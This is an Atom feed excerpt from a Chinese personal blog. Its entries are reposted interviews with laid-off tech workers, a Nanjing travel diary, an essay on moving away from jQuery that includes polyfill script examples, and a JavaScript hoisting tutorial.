<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Ray&#39;s Blog</title>
  
  <subtitle>Google SEO|互联网营销|工业矿山机械</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.love4026.org/"/>
  <updated>2019-02-07T14:01:38.527Z</updated>
  <id>https://www.love4026.org/</id>
  
  <author>
    <name>Ray</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>寒冬之下，被cai的那些人到底去哪了？</title>
    <link href="https://www.love4026.org/20181230/2018-cold-winter-where-the-people-who-were-laid-off/"/>
    <id>https://www.love4026.org/20181230/2018-cold-winter-where-the-people-who-were-laid-off/</id>
    <published>2018-12-30T18:30:54.000Z</published>
    <updated>2019-02-07T14:01:38.527Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>转载这篇文章，内容不重要，就是记录下，都说2018是经济下行最严重的一年，虽然之前一直感受不到，但看到这么多文章，联想到自身，还是有点感受的，这两天在 v2ex 看到一篇文章，一个员工请假没一级领导批了，二级领导没有批，在网上发帖吐槽，CTO还回复，当然肯定都是骂 CTO的，生活不易，2018尤其是。 <a href="https://www.v2ex.com/t/522131" target="_blank" rel="noopener">https://www.v2ex.com/t/522131</a></p></blockquote><p>相信这个冬天，大家都看到了各种被cai和别名为『优化调整』的新闻。自从我发表《终于，这个冬天，我也被cai了》文章后，很多媒体和记者，每天都在加我微信，表示想做一些访谈，关于被cai人员的生活实录。当然我没有应允，一个是没有这么多时间，二个是公号就是对外的窗口，有什么想聊的，或者分享的，也会第一时间在公号同步，不想聊的，自然也不会再陈述。事情总是有聚集效应，很多被cai或优化的老铁，都被聚集到了我周围。一方面，大家处境一样，有共同点。二方面，可以彼此勉励下。索性这次就自己做了一次访谈实录，在征求他们同意后，我以实录方式，向大家还原被cai人员后的生活状态。为保证部分隐私，实录中访谈人均为化名。</p><h2 id="人物一：小A"><a href="#人物一：小A" class="headerlink" title="人物一：小A"></a>人物一：小A</h2><p>被cai时间：12中旬</p><p>年龄：24</p><p>那天我正在外面，手机上弹出几条消息，说的是：鱼哥，我刚刚被谈话了，然后进入了被cai名单中。赔偿是N+1，这个月就要签字走人了。目前有没有工作机会推荐？我说：先别慌，工作不要立马去找。先多准备准备。不然机会很容易浪费。小A在深圳，之前也是线下见过的。本科毕业2年了，在一家小公司做Android开发。老家是湖北的。女票是进公司后下手的。不过他们关系公开后，女票换了家公司，所以这次还好不是两人被cai，小A表示目前也是打算年后看机会的，现在相当于加速了他被动出去找工作。突然被抱出公司，被cai那几天很焦虑，虽然没有房贷、还有其他压力，但是感觉总是不太爽。我说，你这还年轻，出去分分钟找一份工作了，先好好准备，后面再投简历。最近一段时间，他都是在复习和准备。元旦后会开始尝试接触一些工作机会。小A表示女票还有家里人目前给他全力支持。他也有自信找一份好工作，毕竟也是打算年后换工作的。</p><h2 id="人物二：大B哥"><a href="#人物二：大B哥" class="headerlink" title="人物二：大B哥"></a>人物二：大B哥</h2><p>被cai时间：12上旬</p><p>年龄：37</p><p>相比于其他被cai的老铁而言，大B哥属于年纪稍大的。工作有10多年了，过去实际履历都是很不错，都是在大厂一线开发，后面36岁时，开始转向小公司做了一个小leader。当然这家公司已经过了C轮了。商业模式上其实算比较成熟。他过去是肩负一个全新的项目负责人，包括搭建团队，开发迭代产品。从去年11月开始到18年3月，几乎都是在招人，自己肩负一些开发工作。到12月，产品已经迭代了6个版本。眼看产品一天一天都在变好，相信过不久就可以给公司盈利。大B哥每次和我聊天，都老是让我帮他多推荐点人，项目缺人。并说公司靠谱，有前途，现金流充沛。他以后也不打算换工作，就把这个产品做好、做大、做强就行。是哇，愿景总是美好的，突然，12月上旬，公司宣布不再战略支持他这个项目了，因为快1年了，给公司带来收益不是太明显，管理层决定砍掉这个项目。并开始让大B哥通知他的下属这次优化调整。公司会按法律进行赔偿，大B哥说他当时第一个想到就是那个昨天刚入职的下属，好不容易把他从别的大厂挖角过来胡，今天让他去通知，这对他来说，有点说不出口，于是问，cai员计划是怎样的，HR告知他，是整个业务线都砍掉。也包括他自己。这对大B来说，有点接受不了，当场就反驳说：为什么不等到明年初再做这个决定？HR表示，这个是管理层做的决定，我们也不是太清楚。然后大B哥，去问他的领导，他领导说，互联网公司看的是盈利能力，短期无法盈利，就无法去讲故事忽悠投资人的钱，就无法拿到下一个风投。大B哥说，盈利从来不是一蹴而就的哇，然后负责人告诉他，公司老板就是靠投机主义者起家的，现在钱不好赚，只有节衣缩食才能过冬。这时大B内心一阵心寒，他想起了那个高大伟岸的老板，开会时总是说，兄弟们，我们有的是钱，我们会加大这个战略项目的投入。你们辛苦点，平时没事多加点班。年底了，给大家多发奖金。大B哥曾连续加班3个月，后来病倒了，在医院病床上还在完成关键模块开发。如今，老板一句话，所有努力付诸东流。大B哥说，他那时真有点想不开和想不通。说好的一起越快的玩耍呢。大B哥在这个年龄被cai，相比其他人来说，要挺的压力更大。比如他的房贷，老婆是全职太太，还有两个老人。因为年龄越大，机会越少，要求越高。这一点他是明白的。不过他说他这个年纪，还好认识很多人，人脉相比技能更重要，朋友得知他的情况后，很快就有联系到他，确实有些团队还缺一些负责人，加上他口碑不错，直接和老板聊好后。最近已经入职了某公司，可以说，也是有惊无险。</p><h2 id="人物三：小C"><a href="#人物三：小C" class="headerlink" title="人物三：小C"></a>人物三：小C</h2><p>被cai时间：12下旬</p><p>年龄：25</p><p>不同于小A和大B哥那样，小C可能没这么幸运了，他是国内某大厂被优化掉的一波。今年的应届刚毕业，上班还不到一年。他正是属于技术积累期，如今被cai后，他处于很被动。毕业以来，以为可以安安稳稳呆个几年。他说，他平时经常水群，口头说的最多的是，我厂这个很强，我厂那个很强，我厂就是牛逼，等等。他说，他曾经引以为豪的公司，现在对应届生也开闸刀，有点心寒。被cai的不只他一个应届生，过去在别人夸他在某厂时，他总是有很强的优越感。是啊，对于刚出社会的学生，加入大厂的确是一件引以为豪的事情。我告诉小C，我们这种工作有一定年限的人，实际上并不会care这些东西，大厂也好，小公司也罢，都是自己硬，才是最好的背书。我之前也面试一些大厂的，技术越厉害，其实和公司关联度越小。技术不是厉害，反而需要更多公司xx项目来衬托他。厉害的人，一定不是公司塑造的。当然离不开公司平台支持，这个毋庸置疑。小C说，自己目前有点不知所措。出来就是社招了，不是他过去那样参加应届生秋招和春招的身份。项目经验也不是很多。重新找工作，没有底。我说，你先梳理下自己知识，然后查漏补缺。也先多准备准备，过年还有30多天了，实在不行，明年上来再找。他担心明年上来，和他一样优化或者被cai的人会很多，同样岗位，面临竞争更激烈，想在年前敲定岗位。我举了个例子，今年房价这么高，每天还有那么多人在不动产中心交易。你是刚需，管他涨也好，跌也罢，有钱，就应该果断入手哇，没有什么可犹豫的。工作这个也是，岗位总是有的，多和少。你也是要有所储备，不然就是机会很多，一个也抓不住。所以当下，应该静下来总结总结。小C说，天越来越冷，一个人住在出租屋里，出门吃饭都懒的吃。买了一些馒头，将就啃着。我和小C说，我14年在北京连续啃馒头几个月，住几个人合租上下铺。最后不也找到工作了。小C表示，没有告知家里人，主要不想让家里人为自己担心，毕竟这么大的人了。最近很多公司快开年会了，小C电话告诉家里人说，他马上要参加他们公司的年会，到时人超级多，规模非常大，还有很多盛宴，到时发照片給看。他和我表示，自己也想感受一下大厂的年会氛围，毕竟工作第一年。如今只能在开年会那天，去朋友圈盗几张前同事发的图了。因为他说，在父母眼里，他是家里的骄傲。</p><h2 id="人物四：D哥"><a href="#人物四：D哥" class="headerlink" title="人物四：D哥"></a>人物四：D哥</h2><p>被cai时间：12中旬</p><p>年龄：30</p><p>D哥是在从传统行业半路转到开发上来的。在27岁时，参加了某马训练营培训，那时某马培训真是一个火热，出去人人都找到工作，个个薪资上w。所以D哥也这时参与到为期4个月培训中了，虽然学费1w多，但是老师说了，出去毕业分分钟就拿这么多工资，D哥说自己在传统行业，也就4000多块钱，长期干下去，即便当了小领导，也就6000-7000，所以他转型做IT。主要还是因为IT收入高。D哥是个能吃苦的人。他说自己在参加某马训练营资格考试时，每天学基础学到晚上2点多，白天早上起来继续学习。后来通过了某马训练营入学资格。在为期4个月学习时，他表示自己过去这么多年，都没有那么努力过，我理解，也许当一个人确实想改变自己时，再大的困难也会克服。后面4个月结束后，确实像某马宣传那样大家都找到了待遇不错的工作，当然班里部分同学是用假经验找到的，后面大家都真正工作后，就有了真实工作经验。但是也有不少人因为学历造假被公司直接开除也有，主要是部分公司必须要本科以上文凭，不得已，有些同学为了进去，但是却只有专科文凭，所以才弄了个假本科证。D哥说自己比较老实，去面试就直说自己半路转行的，学习和积累近一年，优点就是能抗压，学习能力强。当然大部分公司对于他这个说法，还是不感冒的，毕竟企业招人是干活的，尽量找的是有较多经验的人。但是他说，有一家初创公司接纳了他，他猜主要他对工资要求不是太高，为人比较老实和靠谱。初创公司前期也是摸石头过河。虽然没有班里其他人薪资高，但D哥很满足，毕竟这是转型的第一步。7800的月薪，让他已经对互联网充满信心。过了1年，他跳槽去一家中型企业了，因为觉得人总是要一步一步改变，这是我在D哥身上看到的。但是中型企业今年也过得很艰难。加上各方面对D哥的综合评价，虽然他努力，但是一些东西确实产出有限。在cai员指标名单中，自然也就有了他。当然他也直言不讳说，有部分原因也是职场潜规则导致。巴拉巴拉一堆。他目前表示，暂时先不找工作，先回家好好过个年。因为还要完成和对象结婚摆酒的喜事，要操办，明年过完年，再好好准备。摆酒的事情大于工作。D哥表示，工作过完年应该能找到，我都30岁了，娶媳妇生娃是头等大事。对于D哥，一路吃过苦、受过挫折过来的，尽管被cai了，我相信他内心早已经埋下韧性的种子。</p><p>听完了实录，很多人可能会思考，不同的人，不同经历，状态、看法，采取方式都是不同。我想这也许是构成了我们多彩的世界吧~</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;转载这篇文章，内容不重要，就是记录下，都说2018是经济下行最严重的一年，虽然之前一直感受不到，但看到这么多文章，联想到自身，还是有点感受的，这两天在 v2ex 看到一篇文章，一个员工请假没一级领导批了，二级领导没有批，在网上发帖吐槽，CTO还回复
      
    
    </summary>
    
      <category term="转载" scheme="https://www.love4026.org/categories/%E8%BD%AC%E8%BD%BD/"/>
    
    
      <category term="工作" scheme="https://www.love4026.org/tags/%E5%B7%A5%E4%BD%9C/"/>
    
  </entry>
  
  <entry>
    <title>中秋南京二日游</title>
    <link href="https://www.love4026.org/20180925/nanjing-travel/"/>
    <id>https://www.love4026.org/20180925/nanjing-travel/</id>
    <published>2018-09-25T13:19:33.000Z</published>
    <updated>2019-02-07T14:01:38.531Z</updated>
    
    <content type="html"><![CDATA[<p>去年今日，婚姻大事。今日已经又回到上海了，岁月流转，感觉时间越来越快了。毕竟不是孤身一人在上海了，有亲爱的老婆在身边，即使再远，也有守望的人。</p><p>三天假期，去了南京二天，一天逛了上海。节日的气氛不是很浓了，但月亮还是那么远。</p><p><img src="/wp-content/media/15386382178973.jpg" alt=""></p><p><img src="/wp-content/media/15386384757104.jpg" alt=""></p><hr><p><img src="/wp-content/media/15386391617814.jpg" alt=""></p><p>南京总统府如此之小，又如此之大，可以装的下整个政府系统。</p><p><img src="/wp-content/media/15386391872796.jpg" alt=""><br>明孝陵，的确可以称得上中国最大的还保存较好的陵墓，其实地面上的建筑也只有石头保存的较好，你能看到的任何一颗树都不会超过100年。</p><p><img src="/wp-content/media/15386393198949.jpg" alt=""><br>中山陵比孝陵的位置要高，连里面的石碑也要特意高过孝陵，以后任何人的墓也不能超过它。</p><p><img src="/wp-content/media/15386394798086.jpg" alt=""><br>南京博物院，里面有丰富的文物展示，比我去过的任何博物馆都多，即使是在北京也没见这么多过。</p><p>二天的时间看的匆匆忙忙，但避过了十一的人流高峰，终于是到了这个一直想来的城市。</p><p><img src="/wp-content/media/15386396697461.jpg" alt=""><br><img src="../wp-content/media/15386397317747.jpg" alt=""><br>上海的繁华还是挺美的。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;去年今日，婚姻大事。今日已经又回到上海了，岁月流转，感觉时间越来越快了。毕竟不是孤身一人在上海了，有亲爱的老婆在身边，即使再远，也有守望的人。&lt;/p&gt;
&lt;p&gt;三天假期，去了南京二天，一天逛了上海。节日的气氛不是很浓了，但月亮还是那么远。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/
      
    
    </summary>
    
      <category term="个人日志" scheme="https://www.love4026.org/categories/%E4%B8%AA%E4%BA%BA%E6%97%A5%E5%BF%97/"/>
    
    
      <category term="旅游" scheme="https://www.love4026.org/tags/%E6%97%85%E6%B8%B8/"/>
    
  </entry>
  
  <entry>
    <title>[转载]再见JQuery，我的老朋友</title>
    <link href="https://www.love4026.org/20180830/goodbye-jquery/"/>
    <id>https://www.love4026.org/20180830/goodbye-jquery/</id>
    <published>2018-08-30T03:56:30.000Z</published>
    <updated>2019-02-07T14:01:38.527Z</updated>
    
    <content type="html"><![CDATA[<p>目前来说，随着html5的兴起，大部分网站已经可以抛弃jQuery了，但仍有部分行业是离不开它的，主要为了兼容IE浏览器，有很多的jQuery插件也导致它不太可能立即消失。</p><p>但对于大部分网站来说，不使用jQuery一样可以做到同样的效果，原生的JS目前已经可以和jQuery一样方便了。</p><p>我09年接触jQuery到现在也差不多快10年了，看着前端日新月异的变化，中间也错失了很多，在这缤纷变化的世界里，有时一旦不愿意接受变化，就会慢慢的被淘汰。很多3-5年的技术人员，还是一直用着jQuery，对于新的技术没有积极去学习尝试，导致离主流技术越来越远，自己的竞争力也在下降。</p><p>最近看到一篇关于jQuery的文章，jQuery的确过时了，虽然一时也不会死掉，但我们要看到这种趋势。</p><h3 id="Polyfill-io"><a href="#Polyfill-io" class="headerlink" title="Polyfill.io"></a>Polyfill.io</h3><p><strong>自动化的 JavaScript Polyfill 服务</strong></p><p>Polyfill 可以为旧浏览器提供和标准 API 一样的功能。比如你想要 IE 浏览器实现 Promise 和 fetch 功能，你需要手动引入 es6-promise、whatwg-fetch。而通过 Polyfill.io，你只需要引入一个 JS 文件。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.polyfill.io/v2/polyfill.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Polyfill.io 通过分析请求头信息中的 UserAgent 实现自动加载浏览器所需的 polyfills。</p><p>Polyfill.io 有一份默认功能列表，包括了最常见的 polyfills：document.querySelector、Element.classList、ES5 新增的 Array 方法、Date.now、ES6 中的 Object.assign、Promise 等。</p><p>你也可以通过传递 features 参数来自定义功能列表：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 加载 Promise&amp;fetch --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.polyfill.io/v2/polyfill.min.js?features=Promise,fetch"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 加载所有 ES5&amp;ES6 新特性 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.polyfill.io/v2/polyfill.min.js?features=es5,es6"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Polyfill.io 还提供了其他 API，具体请查阅官方文档：</p><p>以下是原文：</p><pre><code>免责声明本文是仓促之作，从构思到成文不足半天。文中没有提到很多优秀的库和框架，提前在此致歉，因为没时间搜集整理。但这不代表笔者对这些库和框架没有敬意。实际上，包括jQuery在内，我的敬意是给这些名字背后整个社区和贡献者的，当然包括库和框架的最初编写者，比如John Resig。另外，时间所限，本文粗略、不严谨，甚至可能不客观地描绘了前端技术的发展脉络。对前端发展走向的这个判断，仅代表本人自己的主观认知，并非业界共识，恳请广大读者了解。千万不要以本文观点作为评价前端技术发展的依据。谢谢！作者：奇舞周刊链接：https://juejin.im/post/5b5af8565188251b186bcfcb来源：掘金著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</code></pre><h3 id="Github抛弃jQuery"><a href="#Github抛弃jQuery" class="headerlink" title="Github抛弃jQuery"></a>Github抛弃jQuery</h3><p>2018年7月25日，Mislav Marohnić发了一条推文，宣布GitHub.com前端已经彻底删除了jQuery（下图）。而且，还自问自答地解释（低调炫耀），删除jQuery之后也没用其他框架，而是全部依赖原生API。</p><p>很多人不知道，我和jQuery颇有渊源。大概11年前（2007年），因为“疯狂迷恋”jQuery，我在国内率先翻译了jQuery 1.1的文档。后来有同好基于我翻译的版本继续翻译了jQuery新版文档，还不忘记在“关于”中提到我（<a href="http://hemin.cn/jq/about.html）：" target="_blank" rel="noopener">http://hemin.cn/jq/about.html）：</a></p><p>居然称我为“国内jQuery的引路人”，惭愧。但在当时jQuery文档奇缺的情况下，我翻译的中文版应该是帮到了不少同学的。后来，我还翻译了Learning jQuery（《jQuery基础教程》）。<br>正因与jQuery的这个不解之缘，GitHub.com彻底抛弃jQuery的消息才触动我想了一些事。于是，决定写这篇小文，以飨读者（但愿有用，哈哈）。</p><h3 id="jQuery的辉煌"><a href="#jQuery的辉煌" class="headerlink" title="jQuery的辉煌"></a>jQuery的辉煌</h3><p>jQuery最初诞生于2006年8月，作者是John Resig（<a href="https://zh.wikipedia.org/wiki/JQuery）。10多年前，网页开发者（当时还没有“前端”这个概念）深受浏览器不兼容性之苦。以jQuery为代表的一批JavaScript库/框架应运而生：" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/JQuery）。10多年前，网页开发者（当时还没有“前端”这个概念）深受浏览器不兼容性之苦。以jQuery为代表的一批JavaScript库/框架应运而生：</a></p><ul><li>Dojo</li><li>jQuery</li><li>MooTools</li><li>Prototype</li><li>Yahoo! User Interface Library (YUI)</li><li>Script.aculo.us</li></ul><p>这些库有的像jQuery一样是主打通用性，比如Dojo、Prototype；有的则走更专业化的路线，比如YUI（组件化）和Script.aculo.us（动画交互）。从通用功能看，这些库大都提供了如下特性：</p><ul><li>语法糖：链式调用、实用函数</li><li>选择元素：基于各种标准选择符和库自定义的选择符，以及通过回调进行筛选</li><li>操作DOM：创建和操作元素，乃至各种属性操作</li><li>处理事件：ready事件及各种注册和触发事件的方法，乃至委托</li><li>动画：基于animate的CSS属性动画，以及内置动画方法</li><li>Ajax：封装原生的XMLHttpRequest API，简化请求方法及回调处理</li></ul><p>一批宣传和推广这些库和框架的书籍相继面世，迅速推动了这些库的采用。2010年出版的DOM Scripting, 2nd（《JavaScript DOM脚本编程艺术（第2版）》）就是其中之一。这本书专门有一个附录，介绍当时流行的库，主推jQuery。</p><p>当时jQuery官网的自我描述是这样的：</p><p>  “a fast and concise JavaScript Library that simplifies HTML document traversing, event handling, animating, and Ajax interactions for rapid web development. jQuery is designed to change the way that you write JavaScript.”</p><p>不错，正是这样。jQuery凭借其选择器方法、面向集合的链式调用、对事件和Ajax的完善支持、简单而强大的动效等独有优势，迅速风靡，成为几乎所有网站开发必备的JavaScript库，乃至开创了jQuery编程风格。</p><p>开发者选择jQuery的理由简单直接：</p><ul><li>跨浏览器</li><li>简单高效</li><li>稳定可靠</li><li>插件丰富</li></ul><p>2011年新版的“犀牛书”第6版——JavaScript: The Definitive Guide, 6th甚至拿出第19章整整64页篇幅隆重讲解了jQuery（“Chapter 19. The jQuery Library”）。</p><p>jQuery从此走向鼎盛和辉煌。后来，随着前端交互越来越重和移动应用的普及，jQuery UI、jQuery Mobile相继面世。</p><p>时至今日，jQuery仍然在支撑着数以千万计各种规模网站的运作——尽管聚光灯下已经不常看到她的身影。</p><h3 id="历史的选择"><a href="#历史的选择" class="headerlink" title="历史的选择"></a>历史的选择</h3><p>最近10年，是“前端行业”有史以来发展最快的10年。</p><p>移动社交时代的到来不仅没有让桌面Web失色，反倒刺激了Web标准的迅猛改进。HTML5不仅带来了极大的向后兼容性，也带来了更丰富的原生DOM API。CSS从CSS3开始走上模块化的快车道，文本样式、排版布局、媒体查询，各种新模块让人目不暇接。</p><p>各大主流浏览器也在快速跟进，Firefox、Chrome、Opera、Safari、IE乃至Edge，都在积极重构甚至重写内核，争做支持Web标准的“楷模”。在这个大背景下，各大互联网公司不断调高兼容的IE版本号，从8到9到10，再到11。</p><p>当然，还有ECMAScript语言标准。自从划时代的ES6（ECMAScript 2015）发布之后，JavaScript终于真正开始摆脱“玩具”语言的尴尬境地。更重要的，从ES6起，ECMAScript也进入了快速迭代、每年发一版的节奏。ES7、ES8，以及ES9，每次都会给这门语言注入更强大的语言特性。</p><p>与此同时，Node.js和Babel等服务端运行时及转译工具的出现，也让前端工程化，以及向传统工业级软件开发最佳实践靠拢的速度日益加快。</p><p>2012年，笔者在图灵社区翻译过一篇文章“JavaScript宝座：七大框架论剑”（<a href="http://www.ituring.com.cn/article/8108）。当时的“七大框架”是：" target="_blank" rel="noopener">http://www.ituring.com.cn/article/8108）。当时的“七大框架”是：</a></p><ul><li>Backbone</li><li>Knockout</li><li>Spine</li><li>CanJS</li><li>Ember</li><li>AngularJS</li><li>Batman</li><li>Meteor</li></ul><p>后来，谷歌主打SPA（Single Page Application，单页应用）的Angular终于一枝独秀。不久，脸书推出的“在JS里写HTML一样优雅”的React则一路高歌猛进。最终，集各家所长且简单易用的Vue横空出世。</p><p>前端开发已经从后“刀耕火种”时代的“农业文明”，逐渐进化为以大规模、可扩展、规范化、自动化为特征的准“工业文明”。<br>俗话说：“皮之不存，毛将焉附。”随着时代变迁、技术进步，jQuery赖以存在的环境正逐渐消失。如前所述，新的环境催生了一批框架新秀。曾经辉煌的jQuery终于走到了可以华丽谢幕的时刻。</p><h3 id="几句忠告"><a href="#几句忠告" class="headerlink" title="几句忠告"></a>几句忠告</h3><p>8年前，DOM Scripting, 2nd在推荐开发者使用前端库时，语重心长地说过下面这段话：</p><p>  “开发中使用库当然没问题，但前提是不要仅仅只知道怎么使用，更要知道它的工作原理。如果不能超越这些库，那在这些库变成你的拐杖之时，你也会随之“残废”。在使用某个库之前，一定要花时间学习掌握JavaScript和DOM。我们从一开头就强调“知其所以然”的重要性，告诉大家不能满足于仅仅“知其然”。如果使用了库，却不晓得其背后原理，无论对自己还是对产品都将是有害的。”</p><p>2012年，从后端转前端不久的Ray Nicholus接手了一个跨浏览器文件上传库（<a href="https://github.com/FineUploader）的维护和开发工作。他的第一反应就是用jQuery重写这个库。然而，用户反对引入任何对其他库的依赖。结果他只能使用原生浏览器的API。那又怎样呢？他发现，原来放弃jQuery的写法比自己想象的要容易。" target="_blank" rel="noopener">https://github.com/FineUploader）的维护和开发工作。他的第一反应就是用jQuery重写这个库。然而，用户反对引入任何对其他库的依赖。结果他只能使用原生浏览器的API。那又怎样呢？他发现，原来放弃jQuery的写法比自己想象的要容易。</a></p><p>2014年，Ray发表了：“You Don’t Need jQuery!”系列博客（<a href="https://blog.garstasio.com/you-dont-need-jquery/）。2016年，他的著作Beyond" target="_blank" rel="noopener">https://blog.garstasio.com/you-dont-need-jquery/）。2016年，他的著作Beyond</a> jQuery （Apress，<a href="https://www.amazon.com/dp/1484222342/）出版。Ray建议，学习前端开发，本来应该是这个顺序：" target="_blank" rel="noopener">https://www.amazon.com/dp/1484222342/）出版。Ray建议，学习前端开发，本来应该是这个顺序：</a></p><ol><li>学习JavaScript</li><li>学习Web API</li><li>学习jQuery（或其他框架/库）</li></ol><p>但很多人实际上是从#3开始的，然后过了很久才开始#1和#2（甚至从来没想过#1和#2）。结果就是“只知其然，而不知其所以然”。</p><p>如今，时移世易，jQuery即将谢幕，新一代组件化开发框架粉墨登场。然而，“太阳底下没有新鲜事。”不管是使用Angular，还是React，抑或是Vue，还是要真正理解它们背后的工作原理。<br>（为避免广告嫌疑，我在这里就不着重推荐360导航前端的刘博文同学即将出版的《深入浅出Vue.js》一书了，哈哈哈～～，因为没有封面可以展示。）</p><h3 id="尾声"><a href="#尾声" class="headerlink" title="尾声"></a>尾声</h3><p>jQuery作为第一代前端库的优秀代表，成就了今天Web的繁荣，也成就了一代Web开发者。作为“国内jQuery的引路人”（这个帽子是别人给的，我借用一下，哈哈），我个人对jQuery的感情是复杂的。既不希望它离开，又希望它早点离开。我想，这应该也是很多早期接触jQuery的前端开发者的心声吧。</p><p>作者：奇舞周刊<br>链接：<a href="https://juejin.im/post/5b5af8565188251b186bcfcb" target="_blank" rel="noopener">https://juejin.im/post/5b5af8565188251b186bcfcb</a><br>来源：掘金<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;目前来说，随着html5的兴起，大部分网站已经可以抛弃jQuery了，但仍有部分行业是离不开它的，主要为了兼容IE浏览器，有很多的jQuery插件也导致它不太可能立即消失。&lt;/p&gt;
&lt;p&gt;但对于大部分网站来说，不使用jQuery一样可以做到同样的效果，原生的JS目前已经可以
      
    
    </summary>
    
      <category term="技术" scheme="https://www.love4026.org/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="jQuery" scheme="https://www.love4026.org/tags/jQuery/"/>
    
  </entry>
  
  <entry>
    <title>Javascript Hoisting 变量提升</title>
    <link href="https://www.love4026.org/20180731/javascript-hoisting/"/>
    <id>https://www.love4026.org/20180731/javascript-hoisting/</id>
    <published>2018-07-31T01:54:32.000Z</published>
    <updated>2019-02-07T14:01:38.531Z</updated>
    
    <content type="html"><![CDATA[<p>函数和变量的声明总是会被解析器悄悄地被“提升”到方法体的最顶部</p><p>上面是javascript变量提升的概念。为了更好地理解“变量提升”，我们先来看一段代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(foo);</span><br><span class="line">    <span class="keyword">var</span> foo = <span class="string">"Javascript"</span>;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>控制台输出：undefined 为什么输出了undefined，而没有报错呢？</p><p>原来javascript是函数作用域，解析器会在函数开头处自动去声明局部变量，局部变量都会被放在函数的入口处定义，所以上面的代码实际会被解释成：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line"> <span class="keyword">var</span> foo;</span><br><span class="line">    <span class="built_in">console</span>.log(foo);</span><br><span class="line">    foo = <span class="string">"Javascript"</span>;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>另外，需要注意Javascript中函数的两种声明方式存在的坑：</p><p>function fn(){} //函数声明式<br>var fn = function(){}; //函数表达式<br>对于函数声明式，解析器会确保在所有代码执行之前声明已经被解析。而对于函数表达式，与定义其它基本类型变量一样，逐句执行并解析。</p><p>我们再来举个例子：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 函数声明式 */</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">fn();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'来自函数声明式fn'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 函数表达式 */</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">fn();</span><br><span class="line"><span class="keyword">var</span> fn = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'来自函数表达式fn'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>控制台依次输出：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">来自函数声明式fn</span><br><span class="line">fn is <span class="keyword">not</span> <span class="keyword">a</span> <span class="function"><span class="keyword">function</span></span></span><br></pre></td></tr></table></figure><p>可以看到，当使用函数声明的形式来定义函数时，可将调用语句写在函数声明之前，而后者，则会报错。</p><p>所以在Javascript中，变量的声明会被提升，而变量的赋值则不会。而函数的声明与变量的声明是不一样的，函数的函数体也会被一起提升，但请使用函数声明的形式才能提升。</p><p>原文: <a href="http://liaokeyu.com/%E6%8A%80%E6%9C%AF/2016/10/18/javascript_hoisting_%E5%8F%98%E9%87%8F%E6%8F%90%E5%8D%87.html" target="_blank" rel="noopener">http://liaokeyu.com/%E6%8A%80%E6%9C%AF/2016/10/18/javascript_hoisting_%E5%8F%98%E9%87%8F%E6%8F%90%E5%8D%87.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
